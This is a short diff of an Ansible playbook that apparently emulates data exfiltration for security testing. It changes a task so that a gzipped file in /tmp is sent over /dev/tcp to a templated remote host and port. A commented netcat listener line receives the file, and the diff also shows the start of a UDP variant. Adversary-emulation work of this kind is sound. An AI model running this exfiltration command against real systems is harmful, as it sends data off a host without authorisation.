@@ -27,7 +27,7 @@
         format: gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol TCP
-      command: cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}
+      shell: cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}
       # netcat -lvp > {{ exfiltration_file }}-tcp.gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol UDP
